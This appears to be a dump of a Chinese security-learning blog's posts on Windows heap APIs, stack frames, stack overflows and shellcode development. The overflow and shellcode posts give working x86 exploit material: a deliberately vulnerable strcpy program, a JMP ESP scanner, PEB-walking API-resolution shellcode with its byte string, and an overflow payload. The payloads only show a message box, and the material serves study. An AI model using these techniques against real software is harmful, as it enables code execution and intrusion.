.下面给_出在此可以指定的标记：HEAP_NO_SERIALIAZE：指定当函数从堆里分配和释放空间时不互斥（不使用互斥锁）。当不指定该标记时默认为使用互斥。序列化允许多个线程操作同一个堆而不会错误。这个标记是可忽略的。HEAP_SHARED_READONLY：这个标记指定这个堆只能由创建它的进程进行写操作，对其他进程是只读的。如果调用者不是可靠的，调用将会失败，错误代码ERROR_ACCESS_DENIDE 。注解：为了使用标记为HEAP_SHARED_READONLY的堆，运行在kernel mode（核心状态）是必须的。 dwInitialSize：堆的初始大小，单位为Bytes。这个值决定了分配给堆的初始物理空间大小。这个值将向上舍入知道下个page boundary（页界）。若需得到主机的页大小，使用GetSystemInfo 函数。 dwMaxmumSize：如果该参数是一个非零的值，它指定了这个堆的最大大小，单位为Bytes。该函数会向上舍入该值直到下个页界，然后为这个堆在进程的虚拟地址里保留舍入后大小的块。如果函数 HeapAlloc 和 HeapReAlloc 要求分配的空间超过参数 dwInitialSize 指定的大小，系统会分配额外的空间给该堆直到这个堆的最大大小。If dwMaximumSize is nonzero, the heap cannot grow and an absolute limitation arises where all allocations are fulfilled within the specified heap unless there is not enough free space. （如果该参数非零，除非没有足够的空间，这个堆总可以增长到该大小）。如果该参数为零，那么该堆大小的唯一限制是可用的内存空间。分配大小超过 0x0018000 Bytes的空间总会失败，因为获得这么大的空间需要系统调用 VirtualAlloc 函数。需要使用大空间的应用应该把该参数设置为零。 返回值成功：一个指向新创建的堆的指针。失败：NULL调用函数 GetLastError 获得更多的错误信息。 附注 这个函数在调用进程里创建一个私有堆，进程可调用 HeapAlloc 函数分配内存空间。这些页在进程的虚拟空间内创建了一个块，在那里堆可以增长。如果 HeapAlloc 函数请求的空间超过了现有的页大小，如果物理空间足够的话，额外的空间将会从已保留的空间里附加。只有创建私有堆的进程可以访问私有堆。如果一个DLL（动态链接库）创建了一个私有堆，那么这么私有堆是在调用该DLL的进程的地址空间内，且仅该进程可访问。系统会使用私有堆的一部分空间去储存堆的结构信息，所以，不是所有的堆内空间对进程来说是可用的。例如：HeapAlloc函数从一个最大大小为 64KB 的堆里申请 64KB 的空间，由于系统占用的一部分空间，这个请求通常会失败。 要求 Minimum supported client Windows XP [desktop apps or Windows Store apps] Minimum supported server Windows Server 2003 [desktop apps or Windows Store apps] Minimum supported phone Windows Phone 8 Header HeapApi.h (include Windows.h);WinBase.h on Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003 and Windows XP (include Windows.h) Library Kernel32.lib DLL Kernel32.dll 参考文献HeapCreate in MSDNHeapCreate()","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"开发shellcode","date":"2017-06-22T15:14:11.000Z","path":"2017/06/22/开发shellcode/","text":"其实在《栈溢出原理与实践》那篇博客里，已经写了十分基础十分简单的shellcode。但是那种shellcode有一缺点：局限性！ 1. shellcode概述1.1 shellcode和exploitshellcode：往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常受到很多苛刻限制，故开发和调试的难度很高。 exploit：一般以一段代码的形式出现，用于生成攻击性的网络数据包或者其他形式的攻击性输入，exploit的核心是淹没返回地址，劫持进程的控制权，之后跳转去执行shellcode，与shellcode具有一定的通用性不同，exploit往往只是针对特定漏洞而言的。 Metasploit通过规范化exploit和shellcode之间的接口把漏洞利用的过程封装成易用的模块，大大减少了exploit开发过程中的重复工作，深刻体现了代码重用和模块化、结构化的思想:（1）所有的 exploit都使用漏洞名称来命名，里面包含有这个漏洞的函数返回地址，所使用的跳转指令地址等关键信息。（2）将常用的shellcode（例如，用于绑定端口反向链接、执行任意命令等）封装成一个个通用的模块，可以轻易地域任意漏洞的exploit进行结合。 1.2 shellcode需要解决的问题由于运行在某个动态链接苦衷的函数在程序运行的过程中被动态加载，这时的栈会动态变化，也即调试器中抄出来的shellcode起始地址下次改变了。所以要编写出通用的shellcode，就需要找到一种途径让程序能够自动定位到shellcode的起始地址。 2. 定位shellcode2.1 栈帧移位与jmp esp动态定位的方法：（1）用内存中任意一个jmp esp指令的地址覆盖函数返回地址，而不是原来手工查出的shellcode起始地址直接覆盖。（2）函数返回后被重定向去执行内存中的这条jmp esp指令，而不是直接开始执行shellcode。（3）由于esp在函数返回时仍指向栈区（函数返回地址之后），jmp esp指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。（4）重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把shellcode恰好放在函数返回地址之后，这样jmp esp指令执行过后恰好跳进shellcode。 2.2 获取跳板地址最简单，最实用的是使用msfpescan获取jmp esp的地址，而且速度更快！！！ 具体指令是: msfpescan -f -j esp PE文件 书中给出了另一种方法： 获取user32.dll内跳转指令地址最直观的方法就是编程搜索内存。其他程序也是如此！ 另一种办法就是使用OllyDbg中的搜索命令指令，对程序命令进行搜索，最终可以找到！搜 JMP ESP 或者 CALL ESP 获取JMP ESP的代码 #include &lt;windows.h&gt; #include &lt;stdio.h&gt; #define DLL_NAME \"user32.dll\" void main() { BYTE *ptr; int position, address; HINSTANCE handle; BOOL done_flag = FALSE; handle = LoadLibrary(DLL_NAME); if (!handle) { printf(\" load dll erro !\"); exit(0); } ptr = (BYTE*)handle; for (position=0; !done_flag; position++) { try { //0xFFE4 is opcode of jmp esp if(ptr[position] == 0xFF && ptr[position+1] == 0xE4) { int address = (int)ptr + position; printf(\"OPCODE(JMP ESP) found at 0x%x\\n\", address); done_flag = TRUE; } } catch(...) { int address = (int)ptr + position; printf(\"END OF 0x%x\\n\", address); //done_flag = TRUE; } } } 上面的方法很具有局限性，因为将jmp esp重新更换为jmp eax时，上述代码就不可用，需要查询相应的opcode 2.3 测试shellcode的可执行性我们可以在vc6.0中编译相应的汇编代码，最好能够正常执行，能够执行了之后，通过OllyDbg获得相应的代码块，导出即可获得完整的代码。 #include &lt;windows.h&gt; void main() { HINSTANCE LibHandle; char dllbuf[11] = \"user32.dll\"; LibHandle = LoadLibrary(dllbuf); _asm{ sub sp,0x440 xor ebx,ebx push ebx //cut string push 0x74736577 push 0x6C696166 //push failwest mov eax,esp //load address of failwest push ebx push eax push eax push ebx mov eax, 0x77E16544 //address should be reset in different OS, this is Win 2000 server call eax //call MessageboxA push ebx mov eax, 0x77E70E7D //address of ExitProcess in Kernel32.dll call eax //call exit(0) } } 如果使用上述地址能够弹出默认窗口，那么代表上述所用的MessageBoxA和ExitProcess的地址都是正确的。 3. 缓冲区的组织3.1 缓冲区的组成如果选用jmp esp作为定位shellcode的跳板，那么在函数返回后要根据缓冲区大小，所需shellcode长短等实际情况灵活布置缓冲区。送入缓冲区的数据分以下几种： 填充物：可以是任意值，但是一般用nop指令对应的0x90来填充缓冲区，并把shellcode布置于其后。这样即使不能准确跳转到shellcode的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。 淹没返回地址的数据：可以是跳转指令的地址、shellcode的地址，甚至是一个近似shellcode的地址。 shellcode：可执行的机器代码 以下是几种缓冲区的组织方式：当缓冲区较大时，倾向于将shellcode布置到缓冲区中。有以下几个好处： 合理利用缓冲区，使攻击串的总长度减小；对于远程攻击，有时所有数据必须包含在一个数据包中！ 对程序破坏小，比较稳定；溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。 3.2 抬高栈顶保护shellcode把shellcode布置在缓冲区中虽然有不少好处，但是也会产生问题。函数返回时，当前栈帧被弹出，这时缓冲区位于栈顶ESP之上的内存区域。在弹出栈帧时只是改变ESP寄存器中的值，逻辑上，ESP以上的内存空间的数据已经作废；物理上，这些数据并没有被销毁。如果shellcode中没有压栈指令向栈中写入数据还没有太大影响；但如果使用push指令在栈中暂存数据，压栈数据很可能会破坏shellcode自身。 当缓冲区相对shellcode较大时，把shellcode布置在缓冲区的“前端”（内存低址方向），这时shellcode离栈顶较远 ，几次压栈可能只会破坏到一些填充nop；但是，如果缓冲区已经被shellcode占满，则shellcode离栈顶比较近，这时的情况就必要危险。 为此，为了提高较强的通用性，通常会在shellcode中一开始就大范围抬高栈顶，把shellcode藏在栈内。 3.3 使用其他跳转指令使用jmp esp做“跳板”的方法是最简单，也是最常用的定位shellcode的方法。在实际的漏洞利用过程中，应当注意观察漏洞函数返回时所有寄存器的值。往往除了ESP之外，EAX、EBX、ESI等寄存器也会指向栈顶附近，故在选择跳转指令地址时也可以灵活一些，除了jmp esp之外，mov eax、esp和jmp eax等指令序列也可以完成进入栈区的功能。 常用跳转指令与机器码的对应关系 机器码（十六进制） 对应的跳转指令 机器码（十六进制） 对应的跳转指令 FF EO JMP EAX FF D0 CALL EAX FF E1 JMP ECX FF D1 CALL ECX FF E2 JMP EDX FF D2 CALL EDX FF E3 JMP EBX FF D3 CALL EBX FF E4 JMP ESP FF D4 CALL ESP FF E5 JMP EBP FF D5 CALL EBP FF E6 JMP ESI FF D6 CALL ESI FF E7 JMP EDI FF D7 CALL EDI 3.4 不使用跳转指令个别苛刻的限制条件的漏洞不允许我们使用跳转指令精确定位shellcode，而使用shellcode的静态地址来覆盖又不够准确，这时我们可以做一个折中，如果过能够淹没大片的内存区域，可以将shellcode布置在一大段nop之后。这时定位shellcode时，只要能跳进这一大片nop中，shellcode就可以得到执行。 3.5 函数返回地址移位一些情况下，返回地址距离缓冲区的偏移量是不确定的，这时我们也可以采取前面介绍过的方法来提高exploit的成功率。 如果函数返回地址的偏移按双字（DWORD）不定，可以用一片连续的跳转指令来覆盖函数返回地址，只要其中有一个能够成功覆盖，shellcode就能得以执行。 函数返回地址距离我们输入的字符串的偏移在不同的计算机上就可能出现按照字节错位 4. 开发通用的shellcode4.1 定位API的原理所有win32程序都会加载ntdll.dll和kernel32.dll这两个最基础的动态链接库。如果想要在win32平台上定位kernel32.dll中的API地址，可采用如下方法：（1）首先通过段选择字FS在内存中找到当前的线程环境块TEB（2）线程环境块偏移位置为0x30的地方存放着指向进程环境块PEB的指针（3）进程环境块中偏移位置为0x0C的地方存放着指向PEB_LDR_DATA结构体的指针。其中，存放着已经被进程装载的动态链接库的信息。（4）PEB_LDR_DATA结构体偏移位置为0x1C的地方存放着指向模块初始化链表的头指针InInitializationOrderModuleList（5）模块初始化链表InInitializationOrderModuleList中按顺序存放着PE装入运行时初始化模块的信息，第一个链表结点是ntdll.dll，第二个链表结点为kernel32.dll（6）找到属于kernel32.dll的结点后，在其基础上再偏移0x08就是kernel32.dll在内存中的加载基地址（7）从kernel32.dll的加载基址算起，偏移0x3C的地方就是PE头（8）PE头偏移0x78的地方存放着指向函数导出表的指针（9）至此，我们可以按如下方式在函数导出表中算出所需函数的入口地址。 导出表偏移0x1C处的指针指向存储导出函数偏移地址(RVA)的列表 导出表偏移0x20处的指针指向存储导出函数函数名的列表 函数的RVA地址和名字按照顺序存放在上述两个列表中，我们可以在名称列表中定位到所需函数是第几个，然后在地址列表汇总找到对应的RVA 获得RVA后，再加上前边已经得到的动态链接库的加载地址，就获得了所需API此刻在内存中的虚拟地址，这个地址就是我们最终在shellcode中调用时需要的地址。 需要说明的是：上述图中所表现的ntdll.dll过了之后就是kernel32.dll并不完全正确，准确的说这只在window xp及其以前是这样的；但是从win7开始，这两者之间加入了kernelbase.dll 4.2 shellcode的加载与测试这一章类似于2.3节的内容，但是有些许的改变，可以与其对照进行查看. #include &lt;windows.h&gt; char shellcode[] = \"\\x66\\x81\\xEC\\x40\\x04\" // SUB SP, 440 \"\\x33\\xDB\" // XOR EBX, EBX \"\\x53\" // PUSH EBX \"\\x68\\x77\\x65\\x73\\x74\" // PUSH 74736577 \"\\x68\\x66\\x61\\x69\\x6C\" // PUSH 6C696166 \"\\x8B\\xC4\" // MOV EAX, ESP \"\\x53\" // PUSH EBX \"\\x50\" // PUSH EAX \"\\x50\" // PUSH EAX \"\\x53\" // PUSH EBX \"\\xB8\\x44\\x65\\xE1\\x77\" // MOV EAX, user32.MessageBoxA \"\\xFF\\xD0\" // CALL EAX \"\\x53\" // PUSH EBX \"\\xB8\\x7D\\x0E\\xE7\\x77\" // MOV EAX, kernel32.ExitProcess \"\\xFF\\xD0\"; // CALL EAX void main() { HINSTANCE LibHandle; char dllbuf[11] = \"user32.dll\"; LibHandle = LoadLibrary(dllbuf); __asm { lea eax, shellcode push eax ret } } 4.3 动态定位API地址的shellcode首先需要知道的是：MessageBoxA： user32.dllExitProcess: kernel32.dllLoadLibraryA: kernel32.dll 由于shellcode最终是要放进缓冲区的，为了让shellcode更加通用，能被大多数缓冲区容纳，我们总是希望shellcode尽可能短。因此一般不会用“MessageBoxA”这么长的字符串进行直接比较。通常会对所用的API函数进行hash运算，搜索导出表时对当前遇到的函数名同样进行hash。对比之后，判断是否是需要的API。 #include &lt;stdio.h&gt; #include &lt;windows.h&gt; DWORD GetHash(char *fun_name) { DWORD digest=0; while(*fun_name) { digest = ((digest7)); // 循环右移7位 digest += *fun_name; // 累加 fun_name++; } return digest; } void main() { DWORD hash; hash = GetHash(\"AddAtomA\"); printf(\"result of hash is %.8x\\n\", hash); } 通过该hash算法获得API函数对应的摘要 API函数 hash值 MessageBoxA 0x1e380a6a ExitProcess 0x4fd18963 LoadLibraryA 0x0c917432 在将hash压入栈中之前，注意先将增量标志DF清零。因为当shellcode是利用异常处理机制而植入的时候，往往会产生标志位的变化，使shellcode中字符串处理方向发生变化而产生错误(如指令LODSD)。 void main() { __asm{ CLD ;clear flag DF ;store hash push 0x1e380a6a ;hash of MessageBoxA push 0x4fd18963 ;hash of ExitProcess push 0x0c917432 ;hash of LoadLibraryA mov esi, esp ;esi = addr of first function hash lea edi,[esi-0xc] ;edi = addr of start writing function ;make some stack space xor ebx,ebx mov bh, 0x04 sub esp, ebx ;push a pointer to \"user32\" onto stack mov bx, 0x3233 ;32 push ebx push 0x72657375 ;user push esp xor edx,edx ;find base addr of kernel32.dll mov ebx, fs:[edx+0x30] ;ebx = address of PEB mov ecx, [ebx+0x0c] ;ecx = pointer to loader data mov ecx, [ecx+0x1c] ;ecx = first entry in initialization order list mov ecx, [ecx] ;ecx = second entry in list ;mov ecx, [ecx] ;ebp = base address of kernelbase.dll in after win7 ;ebp = base address of kernel32.dll in before winxp ;some people may think it is the addr of kernel32.dll ;but it was wrong mov ebp, [ecx+0x8] ;under the test, we know it is the addr of kernel32.dll find_lib_functions: //lodsd ;load next hash into al and increment esi mov eax, [esi] add esi, 0x4 cmp eax, 0x1e380a6a ;hash of MessageBoxA trigger ;LoadLibrary(\"user32\") jne find_functions xchg eax,ebp ;save current hash call [edi - 0x8] ;LoadLibraryA xchg eax,ebp ;restore current hash, and update ebp with base address of user32.dll find_functions: pushad ;preserve registers mov eax, [ebp + 0x3c] ;eax = start of PE header mov ecx, [ebp + eax + 0x78] ;ecx = relative offset of export table add ecx, ebp ;ecx = absolute addr of export table mov ebx, [ecx + 0x20] ;ebx = relative offset of names table add ebx, ebp ;ebx = absolute addr of names table xor edi, edi ;edi will count through the functions next_function_loop: inc edi ;increment function counter mov esi, [ebx + edi * 4] ;esi = relative offset of current function name add esi, ebp ;esi = absolute addr of current function name cdq ;dl will hold hash(we know eax is small) hash_loop: movsx eax, byte ptr[esi] cmp al, ah jz compare_hash ror edx, 7 add edx, eax inc esi jmp hash_loop compare_hash: cmp edx, [esp + 0x1c] ;compare to the requested hash(saved on stack from pushad) jnz next_function_loop mov ebx, [ecx + 0x24] ;ebx = relative offset of ordinals table add ebx, ebp ;ebx = absolute addr of ordinals table mov di, [ebx + 2*edi] ;di = ordinal number of matched function mov ebx, [ecx + 0x1c] ;ebx = relative offset of address table add ebx, ebp ;ebx = absolute addr of address table add ebp, [ebx + 4*edi] ;add to ebp(base addr of module) the relative offset of matched function xchg eax, ebp ;move func addr into eax pop edi ;edi is last onto stack in pushad stosd ;write function addr to [edi] and increment edi push edi popad ;restore registers ;loop until we reach end of the last hash cmp eax, 0x1e380a6a jne find_lib_functions function_call: xor ebx, ebx push ebx ;cut string push 0x74736577 push 0x6C696166 ;push failwest mov eax, esp ;load address of failwest push ebx push eax push eax push ebx call [edi - 0x4] ;call MessageBoxA push ebx call [edi - 0x8] ;call ExitProcess nop nop nop nop } } 其对应的机器码为： char shellcode2[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\"; void main() { __asm { lea eax, shellcode2 push eax ret } }","tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://yoursite.com/tags/shellcode/"},{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"}]},{"title":"栈溢出原理与实践","date":"2017-06-22T14:13:43.000Z","path":"2017/06/22/栈溢出原理与实践/","text":"声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。 1. 栈溢出原理1.1 修改邻接变量的原理用实例来反映原理 #include &lt;stdio.h&gt; #include &lt;string.h&gt; #define PASSWORD \"1234567\" int verify_password(char *password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated; } void main() { int valid_flag = 0; char password[1024]; while(1) { printf(\"please input password: \"); scanf(\"%s\", password); valid_flag = verify_password(password); if (valid_flag) { printf(\"incorrect password!\\n\\n\"); } else { printf(\"Congratulations! You have passed the verification!\\n\"); break; } } } 于是栈帧布局为： 因此，当你输入7位正确密码（&quot;1234567&quot;）或者输入8字节其他字符串（比原始字符串要大），都能通过验证。authenticated是int类型，在内存中是DWORD，占4个字节。所以当输入8位后，数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。 win32系统中数据是由低位向高位存储一个4字节的双字（DWORD），但作为数值应用时，却是按照由高位字节向低位字节进行解释。 如果输入的是1234567，那么结果为：34 33 32 3100 37 36 35一定要注意window字节顺序 1.2 修改函数返回地址通过覆盖返回地址，我们可以跳转到我们想到达的位置 问题1：如何修改返回地址，并准确的判定返回地址所在位置？ 在函数返回的&quot;retn&quot;指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个地址弹入EIP寄存器中，之后跳转到这个地址去执行。栈顶是OllyDbg右侧ESP标灰的那个 所以常见的解决办法是：（1）输入一个较长的字符串，最好这个字符串有一定规律【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_create.rb来创建一定长度的指令】，然后查看返回地址所指向的位置，看看是刚才所指定的字符串的哪个位置【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 来查看字符串出现的地址】（2）本机实验时，offset位置为16（此处的16指的是起始位置），因此如果想要对该程序的返回地址进行修改的话，就应该是 &#39;a&#39;*16+返回地址（返回地址得逆序编写） 问题2：如何控制程序执行流程？ 上面已经讲了如何修改返回地址，所以如果在进入某个子函数之后，有栈溢出，就可以修改相应的返回地址，让其能够跳转至想让其执行代码的位置，这样就能控制流程； 另外一种十分简单的办法就是直接修改PE文件，修改分支指令，这样也可以控制程序执行流程！ 2. 代码植入2.1 测试代码 #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;windows.h&gt; #define PASSWORD \"1234567\" int verify_password(char *password) { int authenticated; char buffer[44]; //add local buff to be overflowed authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); //overflowed here! return authenticated; } void main() { int valid_flag = 0; char password[1024]; FILE *fp; LoadLibrary(\"user32.dll\"); //prepare for messagebox if (!(fp=fopen(\"password.txt\",\"rw+\"))) { exit(0); } //MessageBoxA(0,\"123\",\"123\",0); fscanf(fp, \"%s\", password); valid_flag = verify_password(password); if(valid_flag) { printf(\"incorrect password!\\n\\n\"); } else { printf(\"Congratulations! You have passed the verification!\\n\\n\"); } fclose(fp); } 其中头文件windows.h，是方便程序能够顺利调用LoadLibrary函数去装载user32.dllverify_password函数的局部变量buffer由8个字节增加到44字节，这样做是为了有足够的空间来“承载”我们植入的代码。main函数中增加了LoadLibrary(&quot;user32.dll&quot;)用于初始化装载user32.dll，以便在植入代码中调用MessageBox。 需要完成的工作： 分析并调试漏洞程序，获得淹没返回地址的偏移 获得buffer的起始地址，并将其写入password.txt的相应偏移，用来冲刷返回地址 向password.txt中写入可执行的机器代码，用来调用API弹出一个消息框。 通过调试可以获得buffer数组的起始地址0x0012FAF0，以及password.txt文件中第53~56个字符的ASCII码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址 MSDN对该函数的解释如下： int WINAPI MessageBox( _In_opt_ HWND hWnd, //handle to owner window _In_opt_ LPCTSTR lpText, //text in message box _In_opt_ LPCTSTR lpCaption, //messagebox title _In_ UINT uType //Messagebox style ); hWnd[in] 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口 IpText[in] 字符串指针，所指字符串会在消息框中显示 IpCaption[in] 字符串指针，所指字符串将成为消息框的标题 uType[in] 消息框的风格（单按钮、多按钮等），NULL代表默认风格 熟悉MFC的程序员都知道，系统其实并不存在真正的MessageBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数（ASCII）或者“W”类型函数（UNICODE）调用。因此，本文中用的是MessageBoxA。 用汇编语言调用MessageBoxA需要三个步骤 装载动态链接库user32.dll。MessageBoxA是动态链接库user32.dll的导出函数。虽然大多数有图形界面的程序都已经装载了该库，但是本实验的Console程序并没有默认加载。 在汇编语言中调用该函数需要获得这个函数的入口地址 在调用前需要向栈中从右向左的顺序压入MessageBoxA的4个参数 获取MessageBoxA的方式，我们在《查找动态链接库的API地址》那一篇博文中有讲，这里仅仅给出Windows 2000 Server的MessageBoxA地址为0x77E16544. 下面将让弹出的窗口显示标题和文本内容都为“failwest”，而压入的第一个和第四个参数都为NULL。 机器代码(具体操作可以参见《机器代码与汇编代码的转换》) 机器代码（十六进制） 汇编指令 注释 33DB XOR EBX, EBX 53 PUSH EBX 6877657374 PUSH 74736577 6877657374 PUSH 74736577 压入NULL结尾的&quot;failwest&quot;字符串。之所以使用EBX清零后作为字符串的截断符，是为了避免&quot;PUSH 0&quot;中的NULL，否则植入的机器码会被strcpy函数截断 8BC4 MOV EAX, ESP EAX里是字符串指针 53 PUSH EBX 50 PUSH EAX 50 PUSH EAX 53 PUSH EBX 4个参数按照从右向左的顺序入栈，分别是(0,failwest,failwest,0) 消息框是默认风格，文本区和标题都是&quot;failwest&quot;||B84465E177|MOV EAX, 0x77E16544||FFD0|CALL EAX|调用函数MessageBoxA。这里的地址依据机器而定| 然后在这些代码与53—56处的buffer中0x0012FAF0(返回地址)，其余的字节用0x90(nop指令)填充。 shellcode[] = &quot;\\x33\\xdb\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x77\\x65\\x73\\x74\\x8b\\xc4\\x53\\x50\\x50\\x53\\xb8\\x44\\x65\\xe1\\x77\\xff\\xd0\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\xf0\\xfa\\x12\\x00&quot;","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"}]},{"title":"栈的介绍","date":"2017-06-22T13:18:22.000Z","path":"2017/06/22/栈的介绍/","text":"1、内存的不同用途进程使用的内存按照功能分为以下4个部分：（1）代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取出指令并执行。（2）数据区：用于存储全局变量（3）堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。（4）栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。 协作过程如图所示： 内存中的栈区其实就是系统栈。系统栈由系统来维护。 2、函数调用过程int func_B(int arg_B1, int arg_B2) { int var_B1, var_B2; var_B1 = arg_B1 + arg_B2; var_B2 = arg_B1 - arg_B2; return var_B1 * var_B2; } int func_A(int arg_A1, int arg_A2) { int var_A; var_A = func_B(arg_A1, arg_A2) + arg_A1; return var_A; } int main(int argc, char **argv, char **envp) { int var_main; var_main = func_A(4,3); return var_main; } 同一文件的不同函数的代码在内存代码区中的分布可能是相邻也可能相距很远。代码的调用也如下图所示。 代码区精确的跳转是在与系统栈巧妙地配合过程中完成的。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。 调用时的步骤：（1）母函数调用子函数时，首先现在母函数所在栈帧里压入函数返回地址（一般为调用函数下面一条指令），然后为子函数创建新栈帧并压入系统栈（一般的步骤为push ebp[保存旧栈帧底部] -&gt; mov ebp, esp[将现在的栈顶换做栈帧底部] -&gt; sub esp, xxx[抬高栈顶，为新栈帧开辟空间]）。（2）子函数返回时，子函数的栈帧被弹出系统栈，母函数栈帧中的返回地址出现在栈顶，此时处理器按照这个返回地址重新跳到母函数代码区中执行。 3、寄存器与函数栈帧（1）ESP：栈指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。（2）EBP：基址指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。 在函数栈帧中，一般包含以下几类重要信息：（1）局部变量：为函数局部变量开辟的内存空间。（2）堆栈状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部可以通过堆栈平衡计算得到），用于在本栈中被弹出后恢复出上一个栈帧。（3）函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。 4、函数调用约定与相关指令几种调用方式的差异 C SysCall StdCall BASIC FORTRAN PASCAL 参数入栈顺序 右-&gt;左 右-&gt;左 右-&gt;左 左-&gt;右 左-&gt;右 左-&gt;右 恢复栈平衡操作的位置 母函数 子函数 子函数 子函数 子函数 子函数 函数调用的约定 调用约定的声明 参数入栈顺序 恢复栈平衡的位置 __cdecl 右-&gt;左 母函数 __fastcall 右-&gt;左 子函数 __stdcall 右-&gt;左 子函数 默认情况下，VC会使用__stdcall调用方式 C++类成员函数都有一个this指针，在Windows平台中，这个指针一般是用ECX寄存器来传递的；但如果用GCC编译器编译，这个指针会作为最后一个参数压入栈中。 参数调用步骤： 参数入栈：由右向左压入参数 返回地址入栈：当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继续执行 代码区跳转：处理器从当前代码区跳转至被调用函数的入口处 栈帧调整：保存当前栈帧状态值，以备后面恢复栈帧时使用（EBP入栈）；将当前栈帧切换到新栈帧（EBP&lt;-ESP，更新栈帧底部）；给新栈帧分配空间（将ESP减去所需空间的大小，抬高栈顶） ;调用前 push 参数3 ;假设函数有3个参数，那么参数将由右向左依次入栈 push 参数2 push 参数1 call 函数dizhi ;call指令将同时完成两项工作 ; a) 向栈中压入当前指令的下一条指令在内存中的位置，即保存返回地址 ; b) 跳转到所用函数的入口地址函数入口处 push ebp ;保存旧栈帧的底部 mov ebp, esp ;设置新栈帧的底部（栈帧切换） sub esp, xxx ;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间） 函数返回时的步骤： 保存返回值（通常将函数的返回值保存到EAX中） 弹出当前栈帧，恢复上一个栈帧：在栈帧平衡的基础上，给ESP加上栈帧的大小，降低栈顶，回收当前栈帧的空间；将当前栈帧底部保存的前栈帧EBP值弹入EBP寄存器，恢复上一个栈帧；将函数返回地址弹给EIP寄存器 跳转：按照函数返回地址跳回母函数中继续执行 add esp, xxx ;降低栈顶，回收当前的栈帧 pop ebp ;将上一个栈帧底部恢复到ebp retn ;这条指令有两个功能 ;a) 弹出当前栈顶元素，即弹出栈帧中的返回地址。 ;b) 让处理器跳转至弹出的返回地址，恢复调用前的代码区","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"stack","slug":"stack","permalink":"http://yoursite.com/tags/stack/"}]},{"title":"机器代码与汇编代码的转换","date":"2017-06-22T06:32:31.000Z","path":"2017/06/22/机器代码与汇编代码的转换/","text":"机器代码与汇编代码之间的转换是写shellcode的一个十分重要的环节，所以这一讲主要讲使用那些工具能够方便的进行这两者之间的转换。 Asm2MachineCode(x86)这在吾爱破解工具包=&gt;编辑辅助工具 